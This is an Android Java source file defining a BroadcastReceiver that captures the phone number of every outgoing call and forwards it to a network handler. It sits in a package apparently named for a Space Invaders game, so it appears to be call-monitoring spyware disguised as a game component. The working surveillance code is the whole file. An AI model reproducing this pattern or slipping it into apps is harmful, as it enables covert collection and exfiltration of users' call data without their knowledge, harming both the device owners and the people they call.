package com.cst.spaceinvaders.service.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.cst.spaceinvaders.service.network.Handler;
import com.cst.spaceinvaders.shared.data.OutgoingCall;

public class OutgoingCallReceiver extends BroadcastReceiver
{
    Handler m_networkHandler;

    public OutgoingCallReceiver(Handler networkHandler)
    {
        m_networkHandler = networkHandler;
    }

    @Override
    public void onReceive(Context context, Intent intent)
    {
        String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        m_networkHandler.onOutgoingCall(new OutgoingCall(number));
    }

}
